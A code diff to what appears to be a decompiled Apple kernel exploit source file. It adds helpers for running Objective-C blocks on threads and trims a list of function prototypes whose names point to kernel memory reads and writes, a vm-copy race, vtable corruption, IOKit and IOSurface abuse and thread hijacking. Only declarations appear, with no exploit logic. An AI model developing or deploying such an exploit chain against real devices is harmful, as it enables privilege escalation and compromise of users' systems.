@@ -7,6 +7,7 @@
 #include <defs.h>
 #include <sys/syscall.h>
 #include <stdarg.h>
+#include <Block.h>
 @import Foundation;
 
 #ifndef RECOMP_TRACE_DMAFAIL
@@ -46,6 +47,35 @@
 #else
 #define TRACE_PORTS(...) do { } while (0)
 #endif
+
+static inline void *recomp_copy_void_block_thread_arg(void (^block)(void))
+{
+#if __has_feature(objc_arc)
+  return (__bridge_retained void *)[block copy];
+#else
+  return Block_copy(block);
+#endif
+}
+
+static inline void recomp_release_block(id block)
+{
+#if !__has_feature(objc_arc)
+  Block_release((__bridge const void *)block);
+#endif
+}
+
+static void *recomp_run_copied_void_block_thread(void *arg)
+{
+#if __has_feature(objc_arc)
+  void (^block)(void) = (__bridge_transfer void (^)(void))arg;
+  block();
+#else
+  void (^block)(void) = (void (^)(void))arg;
+  block();
+  Block_release(block);
+#endif
+  return NULL;
+}
 
 
 typedef struct {
@@ -185,11 +215,7 @@ __int64 __fastcall vtable_call_slot2(__int64 a1, __int64 a2);
 __int64 __fastcall setup_notification_extra_args(__int64 a1, __int64 a2, __int64 a3);
 __int64 __fastcall trigger_kstate_write_vtable(__int64 *a1, __int64 a2, __int64 a3);
 __int64 __fastcall pack_exploit_args_buffer(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, __int64 a7, __int64 a8, __int64 a9);
-__int64 __fastcall call_vtable_ptr_slot2(__int64 a1);
 __int64 __fastcall exploit_thread_vmcopy_race(__int64 a1);
-__int64 __fastcall run_exploit_thread(__int64 a1);
-__int64 __fastcall write_kaddr_to_physmap(__int64 a1, unsigned __int8 a2);
-__int64 __fastcall trigger_thread_state_mod(__int64 a1);
 __int64 __fastcall get_ppnum_via_kread(__int64 a1);
 __int64 __fastcall compare_cfdict_entries(const void *a1, const void *a2);
 void __fastcall iterate_cftype_values(const void *a1, CFTypeRef cf, __int64 a3);
@@ -282,9 +308,6 @@ __int64 __fastcall write_task_kobject_fields(__int64 a1, __int64 a2);
 __int64 __fastcall trigger_iokit_property_exploit(__int64 a1);
 __int64 __fastcall wait_thread_ready(__int64 a1, uint64_t **a2);
 __int64 __fastcall thread_hijack_exploit(__int64 a1);
-__int64 __fastcall call_vtable_ptr_slot2_v2(__int64 a1);
-__int64 __fastcall spin_wait_el0_via_ptr(__int64 a1);
-__int64 __fastcall wait_thread_via_ptr(__int64 a1);
 __int64 __fastcall get_task_vm_region_base(task_name_t a1);
 __int64 __fastcall get_task_vm_info_0(task_name_t a1, uint64_t *a2);
 __int64 __fastcall iosurface_enum_mach_port(__int64 a1, unsigned int a2);
